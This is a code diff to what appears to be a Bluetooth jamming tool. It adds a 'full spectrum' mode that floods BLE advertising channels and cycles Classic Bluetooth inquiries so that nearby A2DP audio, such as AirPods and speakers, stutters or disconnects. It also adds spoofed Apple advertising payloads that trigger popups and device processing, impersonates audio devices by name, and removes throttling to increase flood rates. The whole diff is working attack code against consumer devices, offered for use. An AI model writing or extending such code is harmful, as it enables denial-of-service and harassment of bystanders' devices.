@@ -41,6 +41,7 @@ class JamMode(Enum):
     DEAUTH = "deauth"                       # Connection disruption via ADV_DIRECT_IND
     CONNECTION_DISRUPT = "connection_disrupt"  # Spoofed CONNECT_IND PDU injection
     PHANTOM_FLOOD = "phantom_flood"         # Max phantom device generation
+    FULL_SPECTRUM = "full_spectrum"         # BLE + BR/EDR combined maximum disruption
 
 
 # ---------------------------------------------------------------------------
@@ -349,6 +350,89 @@ class RawHCISocket:
             self.supports_ext_adv = False
         return self.supports_ext_adv
 
+    # ------------------------------------------------------------------
+    # BR/EDR Classic Bluetooth Commands (for full-spectrum flooding)
+    # ------------------------------------------------------------------
+
+    def br_edr_inquiry(self, lap: int = 0x9E8B33, length: int = 1,
+                       num_responses: int = 0) -> bool:
+        """HCI Inquiry (OGF=0x01, OCF=0x0001).
+
+        Starts BR/EDR device discovery. The radio transmits inquiry
+        packets on dedicated hop frequencies, creating interference
+        in the Classic BT spectrum used by A2DP audio streaming.
+
+        lap: Lower Address Part (0x9E8B33 = GIAC for general inquiry)
+        length: Duration in 1.28s units (1 = shortest burst)
+        num_responses: Max responses (0 = unlimited)
+        """
+        params = struct.pack('<I', lap)[:3]
+        params += struct.pack('B', length)
+        params += struct.pack('B', num_responses)
+        return self.send_cmd(0x01, 0x0001, params)
+
+    def br_edr_inquiry_cancel(self) -> bool:
+        """HCI Inquiry Cancel (OGF=0x01, OCF=0x0002)."""
+        return self.send_cmd(0x01, 0x0002, b'')
+
+    def br_edr_write_scan_enable(self, scan_enable: int = 0x03) -> bool:
+        """HCI Write Scan Enable (OGF=0x03, OCF=0x001A).
+
+        scan_enable: 0x00=none, 0x01=inquiry only, 0x02=page only, 0x03=both
+        Making the adapter discoverable forces nearby BR/EDR devices to
+        process our inquiry/page responses, consuming their radio time.
+        """
+        params = struct.pack('B', scan_enable)
+        return self.send_cmd(0x03, 0x001A, params)
+
+    def br_edr_write_eir(self, data: bytes = b'') -> bool:
+        """HCI Write Extended Inquiry Response (OGF=0x03, OCF=0x0052).
+
+        Sets EIR data sent during BR/EDR inquiry responses.
+        Max 240 bytes. Used to inject noise into the Classic BT spectrum.
+        """
+        fec = struct.pack('B', 0x00)  # FEC not required
+        padded = data[:240].ljust(240, b'\x00')
+        return self.send_cmd(0x03, 0x0052, fec + padded)
+
+    def br_edr_write_class_of_device(self, cod: int = 0x240404) -> bool:
+        """HCI Write Class of Device (OGF=0x03, OCF=0x0024).
+
+        Sets CoD for BR/EDR discovery responses.
+        0x240404 = Audio/Video + Wearable Headset (mimics audio devices)
+        0x200408 = Audio/Video + Loudspeaker
+        """
+        params = struct.pack('<I', cod)[:3]
+        return self.send_cmd(0x03, 0x0024, params)
+
+    def br_edr_write_local_name(self, name: str = "") -> bool:
+        """HCI Write Local Name (OGF=0x03, OCF=0x0013).
+
+        Sets the device name for BR/EDR discovery. Max 248 bytes.
+        """
+        name_bytes = name.encode('utf-8')[:248].ljust(248, b'\x00')
+        return self.send_cmd(0x03, 0x0013, name_bytes)
+
+    def br_edr_write_inquiry_scan_activity(self, interval: int = 0x0012,
+                                            window: int = 0x0012) -> bool:
+        """HCI Write Inquiry Scan Activity (OGF=0x03, OCF=0x001E).
+
+        Sets inquiry scan interval and window to maximum duty cycle.
+        interval=window=0x0012 (11.25ms) = 100% duty cycle scanning,
+        which means the adapter responds to every inquiry on BR/EDR.
+        """
+        params = struct.pack('<HH', interval, window)
+        return self.send_cmd(0x03, 0x001E, params)
+
+    def br_edr_write_page_scan_activity(self, interval: int = 0x0012,
+                                         window: int = 0x0012) -> bool:
+        """HCI Write Page Scan Activity (OGF=0x03, OCF=0x001C).
+
+        Sets page scan to maximum duty cycle for maximum interference.
+        """
+        params = struct.pack('<HH', interval, window)
+        return self.send_cmd(0x03, 0x001C, params)
+
 
 # ---------------------------------------------------------------------------
 # BluetoothJammer — main jammer class
@@ -424,6 +508,24 @@ class BluetoothJammer:
         b'\x02\x01\x06\x15\xFF\x00\x00\x00\x03',
         # Max-size garbage with AD structure header
         b'\x1E\xFF',
+
+        # --- Apple AirPods / Audio disruption payloads ---
+        # Apple Proximity Pairing (triggers "Not Your AirPods" popup)
+        b'\x02\x01\x06\x1A\xFF\x4C\x00\x07\x19\x07\x02\x20\x75\xAA\x30\x01\x00\x00\x45\x12\x12\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+        # Apple Nearby Info (forces BLE stack re-evaluation)
+        b'\x02\x01\x06\x1A\xFF\x4C\x00\x10\x07\x28\x18\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+        # Apple Handoff beacon (triggers cross-device sync attempt)
+        b'\x02\x01\x06\x1A\xFF\x4C\x00\x0C\x0E\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+        # Apple HomeKit HAP BLE (triggers HomeKit device processing)
+        b'\x02\x01\x06\x14\xFF\x4C\x00\x06\x31\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+        # Apple Magic Switch / AirPods case open
+        b'\x02\x01\x06\x1A\xFF\x4C\x00\x07\x19\x07\x0E\x20\x75\xAA\x30\x01\x00\x00\x45\x12\x12\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+        # Apple Find My network beacon (triggers Find My processing)
+        b'\x02\x01\x06\x1A\xFF\x4C\x00\x12\x19\x10\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF',
+        # Rapid channel pollution: connectable undirected with Apple OUI
+        b'\x02\x01\x02\x1A\xFF\x4C\x00' + b'\xFF' * 24,
+        # Spoofed Beats (Apple subsidiary) manufacturer data
+        b'\x02\x01\x06\x1A\xFF\x4C\x00\x07\x19\x01\x14\x20\x75\xAA\x30\x01\x00\x00\x45\x12\x12\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00',
     ]
 
     def __init__(self, config: dict):
@@ -1243,6 +1345,7 @@ class BluetoothJammer:
             self._enable_ext_adv_sets(enable=True,
                                       count=self.EXT_ADV_SET_COUNT)
 
+            cycle = 0
             while not self._stop_event.is_set():
                 # Rotate random addresses to create phantom devices
                 for handle in range(self.EXT_ADV_SET_COUNT):
@@ -1251,7 +1354,10 @@ class BluetoothJammer:
                 if session:
                     for ch in self.BLE_ADV_CHANNELS:
                         session.record_packet(channel=ch)
-                time.sleep(0.0002)
+                cycle += 1
+                # Yield every 16 cycles to prevent CPU starvation
+                if cycle & 0x0F == 0:
+                    time.sleep(0)
 
             self._enable_ext_adv_sets(enable=False,
                                       count=self.EXT_ADV_SET_COUNT)
@@ -1264,6 +1370,7 @@ class BluetoothJammer:
                 adv_type=0x03,
             )
 
+            cycle = 0
             while not self._stop_event.is_set():
                 self._raw_socket.le_set_random_address(self._random_addr())
                 payload = self._next_payload()
@@ -1286,7 +1393,9 @@ class BluetoothJammer:
                 if session:
                     for ch in self.BLE_ADV_CHANNELS:
                         session.record_packet(channel=ch)
-                time.sleep(0.0002)
+                cycle += 1
+                if cycle & 0x0F == 0:
+                    time.sleep(0)
             self._stop_adv()
 
         else:
@@ -1582,6 +1691,119 @@ class BluetoothJammer:
                 time.sleep(0.001)
             self._stop_adv()
 
+    # ------------------------------------------------------------------
+    # Full-spectrum mode: BLE flood + BR/EDR interference (primary)
+    # ------------------------------------------------------------------
+
+    def _jam_loop_full_spectrum(self):
+        """Full-spectrum jamming: BLE advertising flood + BR/EDR inquiry flood.
+
+        Primary adapter runs BLE ext adv flood on all 3 advertising channels
+        AND interleaves BR/EDR inquiry bursts to disrupt Classic BT audio
+        (A2DP/HFP used by AirPods, headphones, speakers).
+
+        The BLE flood disrupts BLE discovery/connection.
+        The BR/EDR inquiry cycles force nearby Classic BT devices to
+        process inquiry packets, creating co-channel interference on the
+        79 BR/EDR hop channels that A2DP audio streams use.
+        """
+        session = self.sessions[-1] if self.sessions else None
+        ch_map = self.CHANNEL_MAP["all"]
+
+        # Setup BR/EDR interference: make adapter discoverable with
+        # maximum duty cycle scan, spoofed as audio device
+        if self._use_raw and self._raw_socket:
+            self._raw_socket.br_edr_write_class_of_device(0x240404)
+            self._raw_socket.br_edr_write_local_name("AirPods Pro")
+            self._raw_socket.br_edr_write_scan_enable(0x03)
+            self._raw_socket.br_edr_write_inquiry_scan_activity(0x0012, 0x0012)
+            self._raw_socket.br_edr_write_page_scan_activity(0x0012, 0x0012)
+
+            # Set EIR with noise data
+            eir_noise = b'\x1E\xFF\x4C\x00' + os.urandom(236)
+            self._raw_socket.br_edr_write_eir(eir_noise)
+
+        if self._use_ext_adv and self._raw_socket:
+            # Setup 4 BLE ext adv sets on all channels
+            for handle in range(self.EXT_ADV_SET_COUNT):
+                self._raw_socket.le_set_random_address(self._random_addr())
+                self._raw_socket.le_set_ext_adv_params(
+                    adv_handle=handle,
+                    interval_min=self._effective_interval,
+                    interval_max=self._effective_interval,
+                    channel_map=ch_map,
+                    own_addr_type=0x01,
+                    adv_type=0x0010,
+                )
+                self._raw_socket.le_set_ext_adv_data(
+                    adv_handle=handle, data=self._next_payload())
+                self._raw_socket.le_set_ext_scan_rsp_data(
+                    adv_handle=handle, data=self._next_scan_rsp())
+
+            self._enable_ext_adv_sets(enable=True, count=self.EXT_ADV_SET_COUNT)
+
+            cycle = 0
+            inquiry_active = False
+            while not self._stop_event.is_set():
+                # BLE flood: rotate payloads + addresses
+                for handle in range(self.EXT_ADV_SET_COUNT):
+                    self._raw_socket.le_set_random_address(self._random_addr())
+                self._rotate_ext_adv_sets(count=self.EXT_ADV_SET_COUNT)
+
+                # BR/EDR inquiry cycle: start short inquiry every 64 BLE cycles
+                # Inquiry transmits on BR/EDR hop frequencies, interfering
+                # with A2DP data channels
+                if cycle % 64 == 0:
+                    if inquiry_active:
+                        self._raw_socket.br_edr_inquiry_cancel()
+                    self._raw_socket.br_edr_inquiry(
+                        lap=0x9E8B33, length=1, num_responses=0)
+                    inquiry_active = True
+
+                if session:
+                    for ch in self.BLE_ADV_CHANNELS:
+                        session.record_packet(channel=ch)
+
+                cycle += 1
+                if cycle & 0x0F == 0:
+                    time.sleep(0)
+
+            # Cleanup
+            if inquiry_active:
+                self._raw_socket.br_edr_inquiry_cancel()
+            self._raw_socket.br_edr_write_scan_enable(0x00)
+            self._enable_ext_adv_sets(enable=False, count=self.EXT_ADV_SET_COUNT)
+
+        elif self._use_raw and self._raw_socket:
+            # Legacy BLE + BR/EDR
+            self._raw_socket.le_set_adv_params(
+                channel_map=ch_map,
+                interval_min=self._effective_interval,
+                interval_max=self._effective_interval,
+                adv_type=0x03,
+            )
+            cycle = 0
+            while not self._stop_event.is_set():
+                self._raw_socket.le_set_random_address(self._random_addr())
+                self._pipelined_jam_cycle(channel_map=ch_map)
+
+                if cycle % 32 == 0:
+                    self._raw_socket.br_edr_inquiry_cancel()
+                    self._raw_socket.br_edr_inquiry(length=1)
+
+                if session:
+                    for ch in self.BLE_ADV_CHANNELS:
+                        session.record_packet(channel=ch)
+                cycle += 1
+                if cycle & 0x0F == 0:
+                    time.sleep(0)
+            self._raw_socket.br_edr_inquiry_cancel()
+            self._raw_socket.br_edr_write_scan_enable(0x00)
+            self._stop_adv()
+        else:
+            # Fallback: BLE-only flood
+            self._jam_loop_flood()
+
     # ==================================================================
     # SECONDARY ADAPTER JAM LOOPS
     # ==================================================================
@@ -1679,6 +1901,7 @@ class BluetoothJammer:
             self._secondary_enable_ext_adv_sets(
                 enable=True, count=self.EXT_ADV_SET_COUNT)
 
+            cycle = 0
             while not self._stop_event.is_set():
                 for handle in range(self.EXT_ADV_SET_COUNT):
                     self._secondary_raw_socket.le_set_random_address(
@@ -1688,7 +1911,9 @@ class BluetoothJammer:
                 if session:
                     for ch in self.BLE_ADV_CHANNELS:
                         session.record_packet(channel=ch)
-                time.sleep(0.0002)
+                cycle += 1
+                if cycle & 0x0F == 0:
+                    time.sleep(0)
 
             self._secondary_enable_ext_adv_sets(
                 enable=False, count=self.EXT_ADV_SET_COUNT)
@@ -1888,6 +2113,104 @@ class BluetoothJammer:
                 time.sleep(0.001)
             self._secondary_stop_adv()
 
+    def _secondary_jam_loop_full_spectrum(self):
+        """Secondary adapter: BR/EDR-focused full-spectrum flooding.
+
+        While primary handles BLE advertising flood, secondary focuses
+        on Classic Bluetooth interference via:
+        1. Continuous BR/EDR inquiry cycling (hops across 79 data channels)
+        2. Maximum duty-cycle page/inquiry scan (responds to all inquiries)
+        3. BLE advertising flood in between inquiry cycles
+
+        This creates interference on the BR/EDR frequency-hopping channels
+        that A2DP audio uses, causing stuttering, dropouts, or disconnection.
+        """
+        session = self.sessions[-1] if self.sessions else None
+        ch_map = self.CHANNEL_MAP["all"]
+
+        if self._secondary_use_raw and self._secondary_raw_socket:
+            sock = self._secondary_raw_socket
+
+            # Configure BR/EDR for maximum interference
+            sock.br_edr_write_class_of_device(0x200408)  # Audio loudspeaker
+            sock.br_edr_write_local_name("Speaker Pro")
+            sock.br_edr_write_scan_enable(0x03)  # Both inquiry + page scan
+            sock.br_edr_write_inquiry_scan_activity(0x0012, 0x0012)
+            sock.br_edr_write_page_scan_activity(0x0012, 0x0012)
+
+            # Set noisy EIR data
+            eir = b'\x1E\xFF\x4C\x00' + os.urandom(236)
+            sock.br_edr_write_eir(eir)
+
+            if self._secondary_use_ext_adv:
+                # Dual: BLE ext adv + BR/EDR inquiry
+                for handle in range(self.EXT_ADV_SET_COUNT):
+                    sock.le_set_ext_adv_params(
+                        adv_handle=handle,
+                        interval_min=self._effective_interval,
+                        interval_max=self._effective_interval,
+                        channel_map=ch_map,
+                        own_addr_type=0x01,
+                    )
+                    sock.le_set_ext_adv_data(
+                        adv_handle=handle, data=self._next_payload())
+                self._secondary_enable_ext_adv_sets(
+                    enable=True, count=self.EXT_ADV_SET_COUNT)
+
+                cycle = 0
+                inquiry_active = False
+                while not self._stop_event.is_set():
+                    # BLE rotation
+                    for handle in range(self.EXT_ADV_SET_COUNT):
+                        sock.le_set_random_address(self._random_addr())
+                    self._secondary_rotate_ext_adv_sets(count=self.EXT_ADV_SET_COUNT)
+
+                    # BR/EDR inquiry every 32 cycles
+                    if cycle % 32 == 0:
+                        if inquiry_active:
+                            sock.br_edr_inquiry_cancel()
+                        sock.br_edr_inquiry(lap=0x9E8B33, length=1, num_responses=0)
+                        inquiry_active = True
+
+                    if session:
+                        for ch in self.BLE_ADV_CHANNELS:
+                            session.record_packet(channel=ch)
+                    cycle += 1
+                    if cycle & 0x0F == 0:
+                        time.sleep(0)
+
+                if inquiry_active:
+                    sock.br_edr_inquiry_cancel()
+                sock.br_edr_write_scan_enable(0x00)
+                self._secondary_enable_ext_adv_sets(
+                    enable=False, count=self.EXT_ADV_SET_COUNT)
+            else:
+                # Legacy BLE + BR/EDR
+                cycle = 0
+                while not self._stop_event.is_set():
+                    sock.le_set_random_address(self._random_addr())
+                    self._secondary_stop_adv()
+                    self._secondary_set_adv_data(self._next_payload())
+                    self._secondary_start_adv()
+
+                    if cycle % 32 == 0:
+                        sock.br_edr_inquiry_cancel()
+                        sock.br_edr_inquiry(length=1)
+
+                    if session:
+                        for ch in self.BLE_ADV_CHANNELS:
+                            session.record_packet(channel=ch)
+                    cycle += 1
+                    if cycle & 0x0F == 0:
+                        time.sleep(0)
+
+                sock.br_edr_inquiry_cancel()
+                sock.br_edr_write_scan_enable(0x00)
+                self._secondary_stop_adv()
+        else:
+            # No raw socket — fall back to BLE-only flood
+            self._secondary_jam_loop_flood()
+
     def _secondary_jam_loop_reactive_scan(self):
         """Secondary adapter: scan during quiet windows while primary jams.
 
@@ -1975,6 +2298,7 @@ class BluetoothJammer:
             "deauth": (self._jam_loop_deauth, (target,)),
             "connection_disrupt": (self._jam_loop_connection_disrupt, (target,)),
             "phantom_flood": (self._jam_loop_phantom_flood, ()),
+            "full_spectrum": (self._jam_loop_full_spectrum, ()),
         }
         if mode in mode_map:
             fn, args = mode_map[mode]
@@ -2010,6 +2334,8 @@ class BluetoothJammer:
             return (self._secondary_jam_loop_connection_disrupt, (target,))
         elif mode == "phantom_flood":
             return (self._secondary_jam_loop_phantom_flood, ())
+        elif mode == "full_spectrum":
+            return (self._secondary_jam_loop_full_spectrum, ())
         elif mode == "reactive":
             return (self._secondary_jam_loop_reactive_scan, ())
         else:
